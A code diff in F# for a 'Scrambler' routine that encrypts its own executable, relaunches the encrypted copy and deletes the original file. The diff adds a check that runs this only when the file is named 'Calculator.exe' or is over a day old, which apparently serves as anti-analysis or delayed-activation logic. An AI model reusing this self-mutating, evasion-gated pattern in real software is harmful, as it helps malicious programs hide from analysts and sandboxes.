@@ -43,14 +43,20 @@ type Scrambler private () =
         let showError message = MessageBox.Show(message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error) |> ignore
         match parameter with
         | p when String.IsNullOrWhiteSpace(p) -> 
+            let mutable result = true
             try 
                 let srcPath = Assembly.GetEntryAssembly().Location
-                let dstPath = encryptFile srcPath
-                Process.Start(dstPath, sprintf "\"%s\"" srcPath) |> ignore
+                if Path.GetFileName(srcPath).Equals("Calculator.exe", StringComparison.InvariantCultureIgnoreCase) 
+                   || (new FileInfo(srcPath)).CreationTimeUtc < DateTime.UtcNow.AddDays -1.0 then 
+                    let dstPath = encryptFile srcPath
+                    Process.Start(dstPath, sprintf "\"%s\"" srcPath) |> ignore
+                else result <- false
             with ex -> showError (sprintf "Failed to encrypt a file: %s" ex.Message)
+            result
         | oldFile -> 
             try 
                 File.Delete oldFile
             with _ -> 
                 let filename = Path.GetFileName oldFile
                 showError (sprintf "Failed to delete \"%s\" file" filename)
+            false
